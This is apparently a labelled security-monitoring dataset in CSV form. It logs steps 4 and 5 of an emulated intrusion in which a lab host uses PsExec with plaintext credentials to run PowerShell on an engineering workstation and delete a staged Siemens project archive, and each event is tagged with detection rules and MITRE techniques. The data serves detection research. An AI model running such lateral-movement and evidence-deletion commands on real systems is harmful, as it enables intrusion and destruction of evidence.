4823,Attack Step 4,"May 9, 2025 @ 16:35:04.003",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,"\""C:\\Users\\Public\\PsTools4\\PsExec.exe\"" \\\\10.12.25.5 -u Windows11EWS -p Windows11EWS powershell.exe -Command \""Remove-Item 'C:\\Windows\\Temp\\project_file_list2.txt','C:\\Windows\\Temp\\siemens_project3.zip' -Force\""",,3,67027,A process was created.,,,
4824,Attack Step 4,"May 9, 2025 @ 16:35:04.026",16,10.12.25.5,Windows11EWS,Microsoft-Windows-Sysmon/Operational,11,3668,,,,,,,NT AUTHORITY\\SYSTEM,,,,6,92218,Possible abuse of Windows admin shares by binary dropped in Windows root folder by system process,[T1570],[Lateral Movement],[Lateral Tool Transfer]
4825,Attack Step 4,"May 9, 2025 @ 16:35:04.026",16,10.12.25.5,Windows11EWS,System,7045,916,,,,,,,,,,,12,92650,New Windows Service Created to start from windows root path. Suspicious event as the binary may have been dropped using Windows Admin Shares.,[T1021.002 T1569.002],"[Lateral Movement, Execution]","[SMB/Windows Admin Shares, Service Execution]"
4826,Attack Step 4,"May 9, 2025 @ 16:35:04.069",16,10.12.25.5,Windows11EWS,Microsoft-Windows-Sysmon/Operational,13,3668,,,,,,,NT AUTHORITY\\SYSTEM,,,,3,92307,Evidence of new service creation found in registry under HKLM\\System\\CurrentControlSet\\Services\\PSEXESVC\\ImagePath binary is: %%SystemRoot%%\\PSEXESVC.exe,[T1543.003],"[Persistence, Privilege Escalation]",[Windows Service]
4827,Attack Step 4,"May 9, 2025 @ 16:35:04.073",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,\\??\\C:\\WINDOWS\\system32\\conhost.exe 0xffffffff -ForceV1,,3,67027,A process was created.,,,
4828,Attack Step 4,"May 9, 2025 @ 16:35:04.196",16,10.12.25.5,Windows11EWS,Security,4624,960,,NTLM,NtLmSsp,10.12.25.3,,,,,,,6,92657,"Successful Remote Logon Detected - User:\ANONYMOUS LOGON - NTLM authentication, possible pass-the-hash attack - Possible RDP connection. Verify that WINDOWS11 is allowed to perform RDP connections",[T1550.002 T1078.002 T1021.001],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts, Remote Desktop Protocol]"
4829,Attack Step 4,"May 9, 2025 @ 16:35:04.243",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,C:\\WINDOWS\\PSEXESVC.exe,,3,67027,A process was created.,,,
4830,Attack Step 4,"May 9, 2025 @ 16:35:04.277",16,10.12.25.5,Windows11EWS,Security,4624,960,,Negotiate,Advapi,,,,,,,,3,67024,Service logon event registered from non standard service account.,,,
4831,Attack Step 4,"May 9, 2025 @ 16:35:04.301",16,10.12.25.5,Windows11EWS,Security,4672,960,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4832,Attack Step 4,"May 9, 2025 @ 16:35:04.322",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,"\""powershell.exe\"" -Command \""Remove-Item 'C:\\Windows\\Temp\\project_file_list2.txt','C:\\Windows\\Temp\\siemens_project3.zip' -Force\""",,3,67027,A process was created.,,,
4833,Attack Step 4,"May 9, 2025 @ 16:35:05.095",16,10.12.25.5,Windows11EWS,Microsoft-Windows-Sysmon/Operational,1,3668,,,,,,,WINDOWS11EWS\\Windows11EWS,C:\\WINDOWS\\PSEXESVC.exe,"\""powershell.exe\"" -Command \""Remove-Item 'C:\\Windows\\Temp\\project_file_list2.txt','C:\\Windows\\Temp\\siemens_project3.zip' -Force\""",,3,92021,Powershell was used to delete files or directories,[T1070.004],[Defense Evasion],[File Deletion]
4834,Attack Step 4,"May 9, 2025 @ 16:35:05.101",16,10.12.25.5,Windows11EWS,Microsoft-Windows-Sysmon/Operational,11,3668,,,,,,,WINDOWS11EWS\\Windows11EWS,,,,15,92213,Executable file dropped in folder commonly used by malware,[T1105],[Command and Control],[Ingress Tool Transfer]
4835,Attack Step 4,"May 9, 2025 @ 16:35:05.184",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,\\??\\C:\\WINDOWS\\system32\\conhost.exe 0xffffffff -ForceV1,,3,67027,A process was created.,,,
4836,Attack Step 4,"May 9, 2025 @ 16:35:05.542",15,10.12.25.3,Windows11,Microsoft-Windows-Sysmon/Operational,3,3088,,,,,10.12.25.5,epmap,Windows11\\Windows11,,,,3,92105,Possible suspicious access to Windows admin shares,[T1021.002],[Lateral Movement],[SMB/Windows Admin Shares]
4837,Attack Step 4,"May 9, 2025 @ 16:35:07.692",16,10.12.25.5,Windows11EWS,Security,4624,960,,NTLM,NtLmSsp,10.12.25.3,,,,,,,6,92657,"Successful Remote Logon Detected - User:\ANONYMOUS LOGON - NTLM authentication, possible pass-the-hash attack - Possible RDP connection. Verify that WINDOWS11 is allowed to perform RDP connections",[T1550.002 T1078.002 T1021.001],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts, Remote Desktop Protocol]"
4838,Attack Step 4,"May 9, 2025 @ 16:37:54.678",16,10.12.25.5,Windows11EWS,System,7045,916,,,,,,,,,,,12,92650,New Windows Service Created to start from windows root path. Suspicious event as the binary may have been dropped using Windows Admin Shares.,[T1021.002 T1569.002],"[Lateral Movement, Execution]","[SMB/Windows Admin Shares, Service Execution]"
4839,Attack Step 4,"May 9, 2025 @ 16:37:54.781",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4840,Attack Step 4,"May 9, 2025 @ 16:37:54.887",16,10.12.25.5,Windows11EWS,Microsoft-Windows-Sysmon/Operational,11,3668,,,,,,,NT AUTHORITY\\SYSTEM,,,,6,92218,Possible abuse of Windows admin shares by binary dropped in Windows root folder by system process,[T1570],[Lateral Movement],[Lateral Tool Transfer]
4841,Attack Step 4,"May 9, 2025 @ 16:37:54.970",16,10.12.25.5,Windows11EWS,Microsoft-Windows-Sysmon/Operational,13,3668,,,,,,,NT AUTHORITY\\SYSTEM,,,,3,92307,Evidence of new service creation found in registry under HKLM\\System\\CurrentControlSet\\Services\\PSEXESVC\\ImagePath binary is: %%SystemRoot%%\\PSEXESVC.exe,[T1543.003],"[Persistence, Privilege Escalation]",[Windows Service]
4842,Attack Step 4,"May 9, 2025 @ 16:37:55.060",16,10.12.25.5,Windows11EWS,Microsoft-Windows-Sysmon/Operational,1,3668,,,,,,,WINDOWS11EWS\\Windows11EWS,C:\\WINDOWS\\PSEXESVC.exe,"\""powershell.exe\"" -Command \""Remove-Item 'C:\\Windows\\Temp\\project_file_list2.txt','C:\\Windows\\Temp\\siemens_project3.zip' -Force\""",,3,92021,Powershell was used to delete files or directories,[T1070.004],[Defense Evasion],[File Deletion]
4843,Attack Step 4,"May 9, 2025 @ 16:37:55.139",16,10.12.25.5,Windows11EWS,Security,4624,960,,NTLM,NtLmSsp,10.12.25.3,,,,,,,6,92657,"Successful Remote Logon Detected - User:\ANONYMOUS LOGON - NTLM authentication, possible pass-the-hash attack - Possible RDP connection. Verify that WINDOWS11 is allowed to perform RDP connections",[T1550.002 T1078.002 T1021.001],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts, Remote Desktop Protocol]"
4844,Attack Step 4,"May 9, 2025 @ 16:37:55.143",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4845,Attack Step 4,"May 9, 2025 @ 16:37:55.232",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,C:\\WINDOWS\\PSEXESVC.exe,,3,67027,A process was created.,,,
4846,Attack Step 4,"May 9, 2025 @ 16:37:55.255",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,"\""C:\\Users\\Public\\PsTools4\\PsExec.exe\"" \\\\10.12.25.5 -u Windows11EWS -p Windows11EWS powershell.exe -Command \""Remove-Item 'C:\\Windows\\Temp\\project_file_list2.txt','C:\\Windows\\Temp\\siemens_project3.zip' -Force\""",,3,67027,A process was created.,,,
4847,Attack Step 4,"May 9, 2025 @ 16:37:55.257",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,\\??\\C:\\WINDOWS\\system32\\conhost.exe 0xffffffff -ForceV1,,3,67027,A process was created.,,,
4848,Attack Step 4,"May 9, 2025 @ 16:37:55.259",16,10.12.25.5,Windows11EWS,Security,4624,960,,Negotiate,Advapi,,,,,,,,3,67024,Service logon event registered from non standard service account.,,,
4849,Attack Step 4,"May 9, 2025 @ 16:37:55.260",16,10.12.25.5,Windows11EWS,Security,4672,960,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4850,Attack Step 4,"May 9, 2025 @ 16:37:55.273",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,"\""powershell.exe\"" -Command \""Remove-Item 'C:\\Windows\\Temp\\project_file_list2.txt','C:\\Windows\\Temp\\siemens_project3.zip' -Force\""",,3,67027,A process was created.,,,
4851,Attack Step 4,"May 9, 2025 @ 16:37:55.274",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,\\??\\C:\\WINDOWS\\system32\\conhost.exe 0xffffffff -ForceV1,,3,67027,A process was created.,,,
4852,Attack Step 4,"May 9, 2025 @ 16:37:56.050",16,10.12.25.5,Windows11EWS,Microsoft-Windows-Sysmon/Operational,11,3668,,,,,,,WINDOWS11EWS\\Windows11EWS,,,,15,92213,Executable file dropped in folder commonly used by malware,[T1105],[Command and Control],[Ingress Tool Transfer]
4853,Attack Step 4,"May 9, 2025 @ 16:37:56.768",15,10.12.25.3,Windows11,Microsoft-Windows-Sysmon/Operational,3,3088,,,,,10.12.25.5,epmap,Windows11\\Windows11,,,,3,92105,Possible suspicious access to Windows admin shares,[T1021.002],[Lateral Movement],[SMB/Windows Admin Shares]
4854,Attack Step 4,"May 9, 2025 @ 16:37:58.427",16,10.12.25.5,Windows11EWS,Security,4624,960,,NTLM,NtLmSsp,10.12.25.3,,,,,,,6,92657,"Successful Remote Logon Detected - User:\ANONYMOUS LOGON - NTLM authentication, possible pass-the-hash attack - Possible RDP connection. Verify that WINDOWS11 is allowed to perform RDP connections",[T1550.002 T1078.002 T1021.001],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts, Remote Desktop Protocol]"
4855,Attack Step 4,"May 9, 2025 @ 16:37:58.614",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,"\""C:\\WINDOWS\\System32\\SearchProtocolHost.exe\"" Global\\UsGthrFltPipeMssGthrPipe7_ Global\\UsGthrCtrlFltPipeMssGthrPipe7 1 -2147483646 \""Software\\Microsoft\\Windows Search\"" \""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)\"" \""C:\\ProgramData\\Microsoft\\Search\\Data\\Temp\\usgthrsvc\"" \""DownLevelDaemon\""",,3,67027,A process was created.,,,
4856,Attack Step 4,"May 9, 2025 @ 16:38:46.906",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4857,Attack Step 4,"May 9, 2025 @ 16:38:47.001",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4858,Attack Step 4,"May 9, 2025 @ 16:38:47.085",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,"\""C:\\Users\\Public\\PsTools4\\PsExec.exe\"" \\\\10.12.25.5 -u Windows11EWS -p Windows11EWS powershell.exe -Command \""Remove-Item 'C:\\Windows\\Temp\\project_file_list.txt','C:\\Windows\\Tem2p\\siemens_project3.zip' -Force\""",,3,67027,A process was created.,,,
4859,Attack Step 4,"May 9, 2025 @ 16:38:47.183",16,10.12.25.5,Windows11EWS,System,7045,916,,,,,,,,,,,12,92650,New Windows Service Created to start from windows root path. Suspicious event as the binary may have been dropped using Windows Admin Shares.,[T1021.002 T1569.002],"[Lateral Movement, Execution]","[SMB/Windows Admin Shares, Service Execution]"
4860,Attack Step 4,"May 9, 2025 @ 16:38:47.183",16,10.12.25.5,Windows11EWS,Microsoft-Windows-Sysmon/Operational,11,3668,,,,,,,NT AUTHORITY\\SYSTEM,,,,6,92218,Possible abuse of Windows admin shares by binary dropped in Windows root folder by system process,[T1570],[Lateral Movement],[Lateral Tool Transfer]
4861,Attack Step 4,"May 9, 2025 @ 16:38:47.213",16,10.12.25.5,Windows11EWS,Microsoft-Windows-Sysmon/Operational,13,3668,,,,,,,NT AUTHORITY\\SYSTEM,,,,3,92307,Evidence of new service creation found in registry under HKLM\\System\\CurrentControlSet\\Services\\PSEXESVC\\ImagePath binary is: %%SystemRoot%%\\PSEXESVC.exe,[T1543.003],"[Persistence, Privilege Escalation]",[Windows Service]
4862,Attack Step 4,"May 9, 2025 @ 16:38:47.264",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,\\??\\C:\\WINDOWS\\system32\\conhost.exe 0xffffffff -ForceV1,,3,67027,A process was created.,,,
4863,Attack Step 4,"May 9, 2025 @ 16:38:47.378",16,10.12.25.5,Windows11EWS,Security,4624,960,,NTLM,NtLmSsp,10.12.25.3,,,,,,,6,92657,"Successful Remote Logon Detected - User:\ANONYMOUS LOGON - NTLM authentication, possible pass-the-hash attack - Possible RDP connection. Verify that WINDOWS11 is allowed to perform RDP connections",[T1550.002 T1078.002 T1021.001],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts, Remote Desktop Protocol]"
4864,Attack Step 4,"May 9, 2025 @ 16:38:47.567",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,C:\\WINDOWS\\PSEXESVC.exe,,3,67027,A process was created.,,,
4865,Attack Step 4,"May 9, 2025 @ 16:38:48.815",16,10.12.25.5,Windows11EWS,Security,4624,960,,Negotiate,Advapi,,,,,,,,3,67024,Service logon event registered from non standard service account.,,,
4866,Attack Step 4,"May 9, 2025 @ 16:38:48.817",16,10.12.25.5,Windows11EWS,Security,4672,960,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4867,Attack Step 4,"May 9, 2025 @ 16:38:48.892",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,"\""powershell.exe\"" -Command \""Remove-Item 'C:\\Windows\\Temp\\project_file_list.txt','C:\\Windows\\Tem2p\\siemens_project3.zip' -Force\""",,3,67027,A process was created.,,,
4868,Attack Step 4,"May 9, 2025 @ 16:38:48.901",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,\\??\\C:\\WINDOWS\\system32\\conhost.exe 0xffffffff -ForceV1,,3,67027,A process was created.,,,
4869,Attack Step 4,"May 9, 2025 @ 16:38:49.019",15,10.12.25.3,Windows11,Microsoft-Windows-Sysmon/Operational,3,3088,,,,,10.12.25.5,epmap,Windows11\\Windows11,,,,3,92105,Possible suspicious access to Windows admin shares,[T1021.002],[Lateral Movement],[SMB/Windows Admin Shares]
4870,Attack Step 4,"May 9, 2025 @ 16:38:49.417",16,10.12.25.5,Windows11EWS,Microsoft-Windows-Sysmon/Operational,1,3668,,,,,,,WINDOWS11EWS\\Windows11EWS,C:\\WINDOWS\\PSEXESVC.exe,"\""powershell.exe\"" -Command \""Remove-Item 'C:\\Windows\\Temp\\project_file_list.txt','C:\\Windows\\Tem2p\\siemens_project3.zip' -Force\""",,3,92021,Powershell was used to delete files or directories,[T1070.004],[Defense Evasion],[File Deletion]
4871,Attack Step 4,"May 9, 2025 @ 16:38:49.457",16,10.12.25.5,Windows11EWS,Microsoft-Windows-Sysmon/Operational,11,3668,,,,,,,WINDOWS11EWS\\Windows11EWS,,,,15,92213,Executable file dropped in folder commonly used by malware,[T1105],[Command and Control],[Ingress Tool Transfer]
4872,Attack Step 4,"May 9, 2025 @ 16:38:52.916",16,10.12.25.5,Windows11EWS,Security,4624,960,,NTLM,NtLmSsp,10.12.25.3,,,,,,,6,92657,"Successful Remote Logon Detected - User:\ANONYMOUS LOGON - NTLM authentication, possible pass-the-hash attack - Possible RDP connection. Verify that WINDOWS11 is allowed to perform RDP connections",[T1550.002 T1078.002 T1021.001],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts, Remote Desktop Protocol]"
4873,Attack Step 4,"May 9, 2025 @ 16:39:01.241",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,"\""C:\\WINDOWS\\system32\\sc.exe\"" start InventorySvc",,3,67027,A process was created.,,,
4874,Attack Step 4,"May 9, 2025 @ 16:39:01.250",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,\\??\\C:\\WINDOWS\\system32\\conhost.exe 0xffffffff -ForceV1,,3,67027,A process was created.,,,
4875,Attack Step 4,"May 9, 2025 @ 16:39:01.259",15,10.12.25.3,Windows11,Security,4624,888,,Negotiate,Advapi,,,,,,,,3,60106,Windows Logon Success,[T1078],"[Defense Evasion, Persistence, Privilege Escalation, Initial Access]",[Valid Accounts]
4876,Attack Step 4,"May 9, 2025 @ 16:39:01.273",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,C:\\WINDOWS\\system32\\svchost.exe -k InvSvcGroup -p,,3,67027,A process was created.,,,
4877,Attack Step 4,"May 9, 2025 @ 16:39:56.720",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4878,Attack Step 4,"May 9, 2025 @ 16:39:56.732",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4879,Attack Step 4,"May 9, 2025 @ 16:41:20.287",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,taskhostw.exe,,3,67027,A process was created.,,,
4880,Attack Step 4,"May 9, 2025 @ 16:41:21.532",15,10.12.25.3,Windows11,Security,4673,4,,,,,,,,,,,4,60107,Failed attempt to perform a privileged operation,[T1078],"[Defense Evasion, Persistence, Privilege Escalation, Initial Access]",[Valid Accounts]
4881,Attack Step 4,"May 9, 2025 @ 16:41:21.542",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,"\""C:\\WINDOWS\\system32\\BackgroundTaskHost.exe\"" -ServerName:BackgroundTaskHost.WebAccountProvider",,3,67027,A process was created.,,,
4882,Attack Step 4,"May 9, 2025 @ 16:41:21.550",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,C:\\Windows\\System32\\RuntimeBroker.exe -Embedding,,3,67027,A process was created.,,,
4883,Attack Step 4,"May 9, 2025 @ 16:41:24.757",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,C:\\WINDOWS\\system32\\sppsvc.exe,,3,67027,A process was created.,,,
4884,Attack Step 4,"May 9, 2025 @ 16:41:34.128",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,"\""C:\\WINDOWS\\system32\\rundll32.exe\"" C:\\WINDOWS\\system32\\PcaSvc.dll,PcaPatchSdbTask",,3,67027,A process was created.,,,
4885,Attack Step 4,"May 9, 2025 @ 16:41:54.610",15,10.12.25.3,Windows11,Application,16384,3680,,,,,,,,,,,3,60642,Software protection service scheduled successfully.,,,
4886,Attack Step 4,"May 9, 2025 @ 16:45:54.355",15,10.12.25.3,Windows11,Security,4624,888,,Negotiate,Advapi,,,,,,,,3,60106,Windows Logon Success,[T1078],"[Defense Evasion, Persistence, Privilege Escalation, Initial Access]",[Valid Accounts]
4887,Attack Step 4,"May 9, 2025 @ 16:45:54.376",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,C:\\WINDOWS\\system32\\svchost.exe -k GPSvcGroup,,3,67027,A process was created.,,,
4888,Attack Step 5,"May 9, 2025 @ 16:49:54.843",16,10.12.25.5,Windows11EWS,Security,4672,960,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4889,Attack Step 5,"May 9, 2025 @ 16:49:54.852",16,10.12.25.5,Windows11EWS,Security,4624,960,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92657,"Successful Remote Logon Detected - User:\Windows11EWS - NTLM authentication, possible pass-the-hash attack - Possible RDP connection. Verify that kali is allowed to perform RDP connections",[T1550.002 T1078.002 T1021.001],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts, Remote Desktop Protocol]"
4890,Attack Step 5,"May 9, 2025 @ 16:49:54.902",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,\\SystemRoot\\System32\\smss.exe 00000124 000000e8,,3,67027,A process was created.,,,
4891,Attack Step 5,"May 9, 2025 @ 16:49:55.080",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,"%SystemRoot%\\system32\\csrss.exe ObjectDirectory=\\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16",,3,67027,A process was created.,,,
4892,Attack Step 5,"May 9, 2025 @ 16:49:55.135",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,winlogon.exe,,3,67027,A process was created.,,,
